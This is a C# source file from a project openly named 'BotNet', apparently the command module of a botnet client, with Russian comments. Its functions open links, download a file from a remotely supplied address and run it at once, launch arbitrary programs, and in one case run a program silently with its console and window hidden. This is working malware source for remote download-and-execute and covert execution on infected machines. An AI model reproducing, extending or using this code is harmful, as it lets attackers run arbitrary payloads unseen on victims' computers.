using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace BotNet
{
    class Functions
    {
        public static void OpenLink(string URI)
        {
            if (URI.StartsWith("http"))
            {
                Thread thr = new Thread(() => { Process.Start(URI); });
                thr.Start();
            }
        }
        public static void DownloadExecute(string URI)
        {
            Thread thr = new Thread(() =>
            {
                string file_path = Web.DownloadFile(URI);
                Process.Start(file_path);
            });
            thr.Start();
        }
        public static void OpenProgram(string URI)
        {
            Thread thr = new Thread(() =>
            {
                Process iStartProcess = new Process(); // новый процесс
                URI = URI.Replace("&#092;", @"\");
                iStartProcess.StartInfo.FileName = (@URI); // путь к запускаемому файлу
                                                           //iStartProcess.StartInfo.Arguments = " cd C:\Program Files\Microsoft Office\Office16 & WINWORD.EXE"; // эта строка указывается, если программа запускается с параметрами (здесь указан пример, для наглядности)
                                                           // iStartProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; // эту строку указываем, если хотим запустить программу в скрытом виде
                iStartProcess.Start(); // запускаем программу
                                       // iStartProcess.WaitForExit(120000); // эту строку указываем, если нам надо будет ждать завершения программы определённое время, пример: 2 мин. (указано в миллисекундах - 2 мин. * 60 сек. * 1000 м.сек.)
            });
            thr.Start();
        }
        public static void Test(string URI)
        {
            Thread thr = new Thread(() =>
            {
                Process iStartProcess = new Process(); // новый процесс
                URI  = URI.Replace("&#092;", @"\");
                iStartProcess.StartInfo.FileName = (@URI); // путь к запускаемому файлу
                iStartProcess.StartInfo.Arguments = "-silent"; // эта строка указывается, если программа запускается с параметрами (здесь указан пример, для наглядности)      
                iStartProcess.StartInfo.CreateNoWindow = true; //Hides console
                iStartProcess.StartInfo.ErrorDialog = false;
                iStartProcess.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden; //Hides GUI
                                                                                                    //iStartProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; // эту строку указываем, если хотим запустить программу в скрытом виде
                iStartProcess.Start(); // запускаем программу
               // iStartProcess.WaitForExit(120000); // эту строку указываем, если нам надо будет ждать завершения программы определённое время, пример: 2 мин. (указано в миллисекундах - 2 мин. * 60 сек. * 1000 м.сек.)

            });
            thr.Start();
        }
    }
}
